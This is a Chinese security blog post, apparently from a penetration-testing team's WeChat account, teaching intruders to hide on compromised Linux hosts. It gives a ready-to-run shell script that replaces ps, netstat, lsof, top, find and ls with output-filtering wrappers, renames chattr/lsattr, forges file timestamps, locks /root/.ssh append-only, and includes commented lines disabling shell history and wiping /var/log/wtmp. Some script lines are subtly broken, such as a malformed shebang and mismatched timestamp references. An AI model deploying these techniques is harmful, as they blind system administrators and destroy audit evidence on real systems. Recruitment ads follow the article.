> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ytaE-zTxKCa_TAsUA5j8oA)

_**声明**_

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测以及文章作者不为此承担任何责任。  
雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

_**No.1  
**_

_**前言**_

在内网渗透时，有时需要将工具放在目标机进程执行，但这里就需要考虑隐蔽性的问题。

下面所讲的不是什么高大上的技术，只是一些常用的 "包装" 技巧。

_**No.2  
**_

_**进程隐匿**_

**netstat 伪装**

首先，包装下 netstat 命令，ps 路径为：/usr/bin/netstat

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVN6Of5ZPticgRic2X0xxzZMPbs2wK2A8gS90Bm7X6ZdISsicfjJ8woAyyytoO8sEzAb2a2pxyfqH5DQ/640?wx_fmt=png)

之后，创建 /usr/local/bin/netstat 文件，写入内容：

```
# !/bin/bash

/usr/bin/ps $@ | grep -Ev 'name|address|port'
```

最后，赋予执行权限 chmod +x /usr/local/bin/netstat

执行 which netstat 看下命令变化：

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVN6Of5ZPticgRic2X0xxzZMPDiakCoo8nyBYJicrgWejxM5QyeY00cYuAvFozIA35wzXs5ZnLKtUQYIQ/640?wx_fmt=png)

netstat 命令修改前后的对比：

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVN6Of5ZPticgRic2X0xxzZMPx7HYyovowT9Yr1ED4l7kx8Mlc4p53JEAI7a3g3DOcGXm2K1utLxicEA/640?wx_fmt=png)

当我们自己使用时，直接用 /bin/netstat 就 OK 了。  

_**No.3  
**_

_**文件隐匿**_

首先，看下 Linux chattr 命令，用于改变文件属性。这项指令可改变存放在 ext2 文件系统上的文件或目录属性，这些属性共有以下 8 种模式：

*   a：让文件或目录仅供附加用途
    
*   b：不更新文件或目录的最后存取时间
    
*   c：将文件或目录压缩后存放
    
*   d：将文件或目录排除在倾倒操作之外
    
*   i：不得任意更动文件或目录
    
*   s：保密性删除文件或目录
    
*   S：即时更新文件或目录
    
*   u：预防意外删除
    

实战中常用的为 +a (只能追加，不能删除) 与 +i (不能更改) ：

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVN6Of5ZPticgRic2X0xxzZMPGRv3OEicZzkVL7ic8zSxvN1ThfZAiaGF26iaHBpQTLLSibvsYQgefuHxUrw/640?wx_fmt=png)

这里，还需要将 chattr 与 lsattr 命令进程隐藏：

```
mv /usr/bin/chattr /usr/bin/cht
mv /usr/bin/lsattr /usr/bin/lst
```

_**No.4  
**_

_**文件时间修改**_

touch -acmr /bin/ls /usr/bin/cht (修改 后一个文件时间 与 前一个文件时间 一致)

**参数**

*   -a：改变访问时间为当前时间
    
*   -m：改变修改时间为当前时间
    
*   -c：文件不存在不新建文件
    
*   -r：使用参考文件的时间
    
*   -d：设置为指定时间
    
*   -t：设置档案的时间记录
    

_**No.5  
**_

_**附: sh 脚本**_

```
# !/bin/bash

# history
# unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0

# ps
touch /usr/local/bin/ps

cat <<EOF >> /usr/local/bin/ps
# !/bin/bash
/bin/ps \$@ | grep -Ev 'name|address|port'
/usr/bin/ps \$@ | grep -Ev 'name|address|port'
EOF

chmod +x /usr/local/bin/ps && touch -acmr /bin/ps /usr/local/bin/ps

# netstat
touch /usr/local/bin/netstat

cat <<EOF >> /usr/local/bin/netstat
# !/bin/bash
/bin/netstat \$@ | grep -Ev 'name|address|port'
/usr/bin/netstat \$@ | grep -Ev 'name|address|port'
EOF

chmod +x /usr/local/bin/netstat && touch -acmr /bin/netstat /usr/local/bin/netstat

# lsof
touch /usr/local/bin/lsof

cat <<EOF >> /usr/local/bin/lsof
# !/bin/bash
/bin/lsof \$@ | grep -Ev 'name|address|port'
/usr/bin/lsof \$@ | grep -Ev 'name|address|port'
EOF

chmod +x /usr/local/bin/lsof && touch -acmr /bin/lsof /usr/local/bin/lsof

# top
touch /usr/local/bin/top

cat <<EOF >> /usr/local/bin/top
# !/bin/bash
/bin/top \$@ | grep -Ev 'name|address|port'
/usr/bin/top \$@ | grep -Ev 'name|address|port'
EOF

chmod +x /usr/local/bin/top && touch -acmr /bin/top /usr/local/bin/lsof

# find
touch /usr/local/bin/find

cat <<EOF >> /usr/local/bin/find 
# !/bin/bash
/bin/find \$@ | grep -Ev 'name|address|port'
/usr/bin/find \$@ | grep -Ev 'name|address|port'
EOF

chmod +x /usr/local/bin/find && touch -acmr /bin/find /usr/local/bin/lsof

# ls
touch /usr/local/bin/ls

cat <<EOF >> /usr/local/bin/ls
# !/bin/bash
/bin/ls \$@ | grep -Ev 'name|address|port'
/usr/bin/ls \$@ | grep -Ev 'name|address|port'
EOF

chmod +x /usr/local/bin/ls && touch -acmr /bin/ls /usr/local/bin/ls

# chattr & lsattr
# !/bin/bash
mkdir /tmp/.tmp/
chattr +a /tmp/.tmp/
chattr +a /root/.ssh/
mv /usr/bin/chattr /usr/bin/cht
mv /usr/bin/lsattr /usr/bin/lst

# last
# echo "" > /var/log/wtmp
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVN6Of5ZPticgRic2X0xxzZMPrKreUDAdicCXicic9PlhCXCzFiaXXAEyA5jA9SQ2hRHiamzRXyIRdG3SAOg/640?wx_fmt=png)

**修改命令变量后，重启终端生效，执行后记得删除 sh 脚本 ！**

_**No.6  
**_

_**Reference**_

**cat EOF 追加与覆盖**

(http://www.361way.com/cat-eof-cover-append/4298.html)

**Shell 特殊变量**  

(https://blog.csdn.net/u011341352/article/details/53215180)

**chattr**

(https://www.runoob.com/linux/linux-comm-chattr.html)

**touch**

(https://www.cnblogs.com/yangjunh/p/Linux_touch.html)

_**招聘启事**_

安恒雷神众测 SRC 运营（实习生）  
————————  
【职责描述】  
1.  负责 SRC 的微博、微信公众号等线上新媒体的运营工作，保持用户活跃度，提高站点访问量；  
2.  负责白帽子提交漏洞的漏洞审核、Rank 评级、漏洞修复处理等相关沟通工作，促进审核人员与白帽子之间友好协作沟通；  
3.  参与策划、组织和落实针对白帽子的线下活动，如沙龙、发布会、技术交流论坛等；  
4.  积极参与雷神众测的品牌推广工作，协助技术人员输出优质的技术文章；  
5.  积极参与公司媒体、行业内相关媒体及其他市场资源的工作沟通工作。  
【任职要求】   
 1.  责任心强，性格活泼，具备良好的人际交往能力；  
 2.  对网络安全感兴趣，对行业有基本了解；  
 3.  良好的文案写作能力和活动组织协调能力。

简历投递至

bountyteam@dbappsecurity.com.cn

设计师（实习生）

————————

【职位描述】  
负责设计公司日常宣传图片、软文等与设计相关工作，负责产品品牌设计。  
【职位要求】  
1、从事平面设计相关工作 1 年以上，熟悉印刷工艺；具有敏锐的观察力及审美能力，及优异的创意设计能力；有 VI 设计、广告设计、画册设计等专长；  
2、有良好的美术功底，审美能力和创意，色彩感强；精通 photoshop/illustrator/coreldrew / 等设计制作软件；  
3、有品牌传播、产品设计或新媒体视觉工作经历；  
【关于岗位的其他信息】  
企业名称：杭州安恒信息技术股份有限公司  
办公地点：杭州市滨江区安恒大厦 19 楼  
学历要求：本科及以上  
工作年限：1 年及以上，条件优秀者可放宽

简历投递至 

bountyteam@dbappsecurity.com.cn

安全招聘  
————————  
公司：安恒信息  
岗位：Web 安全 安全研究员  
部门：战略支援部  
薪资：13-30K  
工作年限：1 年 +  
工作地点：杭州（总部）、广州、成都、上海、北京

工作环境：一座大厦，健身场所，医师，帅哥，美女，高级食堂…  
【岗位职责】  
1. 定期面向部门、全公司技术分享;  
2. 前沿攻防技术研究、跟踪国内外安全领域的安全动态、漏洞披露并落地沉淀；  
3. 负责完成部门渗透测试、红蓝对抗业务;  
4. 负责自动化平台建设  
5. 负责针对常见 WAF 产品规则进行测试并落地 bypass 方案  
【岗位要求】  
1. 至少 1 年安全领域工作经验；  
2. 熟悉 HTTP 协议相关技术  
3. 拥有大型产品、CMS、厂商漏洞挖掘案例；  
4. 熟练掌握 php、java、asp.net 代码审计基础（一种或多种）  
5. 精通 Web Fuzz 模糊测试漏洞挖掘技术  
6. 精通 OWASP TOP 10 安全漏洞原理并熟悉漏洞利用方法  
7. 有过独立分析漏洞的经验，熟悉各种 Web 调试技巧  
8. 熟悉常见编程语言中的至少一种（Asp.net、Python、php、java）  
【加分项】  
1. 具备良好的英语文档阅读能力；  
2. 曾参加过技术沙龙担任嘉宾进行技术分享；  
3. 具有 CISSP、CISA、CSSLP、ISO27001、ITIL、PMP、COBIT、Security+、CISP、OSCP 等安全相关资质者；  
4. 具有大型 SRC 漏洞提交经验、获得年度表彰、大型 CTF 夺得名次者；  
5. 开发过安全相关的开源项目；  
6. 具备良好的人际沟通、协调能力、分析和解决问题的能力者优先；  
7. 个人技术博客；  
8. 在优质社区投稿过文章；

岗位：安全红队武器自动化工程师  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 熟练使用 Python、java、c/c++ 等至少一门语言作为主要开发语言；  
2. 熟练使用 Django、flask 等常用 web 开发框架、以及熟练使用 mysql、mongoDB、redis 等数据存储方案；  
3: 熟悉域安全以及内网横向渗透、常见 web 等漏洞原理；  
4. 对安全技术有浓厚的兴趣及热情，有主观研究和学习的动力；  
5. 具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JWDJyW3UCBiaNuUteDwicCG6vlaJsxhBpV3EgjHXbn1DnTQHuoRhsTxnbPtWMib5KdDOJxV8TY3vZzVg/640?wx_fmt=jpeg)

专注渗透测试技术

全球最新网络攻击技术

END

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JWDJyW3UCBiaNuUteDwicCG6vicyFHiaicHSHKTE7GlEaPpq7EZ9PTyAEicFlB9Fj2rYShbHf3d4k748PUA/640?wx_fmt=jpeg)